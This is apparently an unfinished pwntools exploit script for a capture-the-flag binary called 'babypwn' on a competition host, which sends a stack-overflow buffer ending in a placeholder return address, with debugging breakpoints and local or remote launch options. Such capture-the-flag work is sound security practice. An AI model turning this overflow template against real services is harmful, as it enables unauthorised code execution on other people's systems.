#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context(terminal=['tmux','new-window'])
context.update(arch='amd64')
exe = './babypwn'

host = args.HOST or 'chal.cybersecurityrumble.de'
port = int(args.PORT or 1990)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

main = 0x000010e0
base =  0x5555555550e0-main

b1 = base + 0x0000147b
b2 = base + 0x000014b9
gdbscript = f'''
b *{hex(b1)}
b *{hex(b2)}
continue
'''

# -- Exploit goes here --

io = start()

rip = 0x4242424242424242
buf = b'A'*118+b'\x00'*2
buf += p64(rip)
io.sendline(buf)
# io.sendline(cyclic(200,alphabet='abcedf',n=8))

pause()
# io.interactive()

